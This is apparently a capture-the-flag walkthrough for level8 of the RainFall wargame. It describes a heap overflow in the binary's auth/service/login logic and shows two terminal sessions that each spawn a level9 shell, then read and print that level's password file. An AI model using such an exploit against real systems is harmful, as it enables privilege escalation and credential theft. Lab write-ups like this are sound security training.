# Level8 Walkthrough

## Analyzing the Program with GDB or Ghidra

1. **Disassemble the program functions**:
    We can see many functions : 
    - `auth` : calls malloc, memset and strcpy 
    - `reset` : calls free
    - `service`: calls strdup
    - `login` : with 2 conditions, one opening a shell and the other a password. If auth with 32bytes is different to 0 then displays addresses of the globals variables auth and service. 

## Running the program

1. **Execute the Program with the Correct Input**:  
   We ran the program with the following command:  
   ```bash
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service 
    0x804a008, 0x804a018 
   ```

   Now, the address of service is exactly 16 bytes after the address of auth. 
   We will have to reach 32 bytes : 16 services bytes and 16 padding bytes.

   `auth` is limited by 4bytes but the strcpy() doesnt verify the size. If input is longer than 4bytes then it overwrite the memory.
 
   We need to trigger the login() condition by : 
   - writing something after auth more than 4 bytes, then you'll write into the memory after auth, cuz it just 4bytes and it copies 5.
   - use the `service` cmd to write a large quantity of data that recover 32 bytes after auth, so that `auth + 0x20` != NULL 


2. **Solution**
    ```bash
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth wnaseeve
    0x804a008, (nil) 
    service geipqhgqiehgieoqhgqepighqeg
    0x804a008, 0x804a018 
    login
    $ whoami
    level9
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    $ 
    ```

    or 

    ```bash
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service 
    0x804a008, 0x804a018 
    service 
    0x804a008, 0x804a028 
    login
    $ whoami
    level9
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    $ 
    ```

    because `service` is `16bytes` so either 2 services or 1 services and 16bytes more padding with chars.

## Moving to level9

1. **Swith User to level9**:
    Run ```su level9```

2. **Authenticate with the Password**:
    We used the password we found.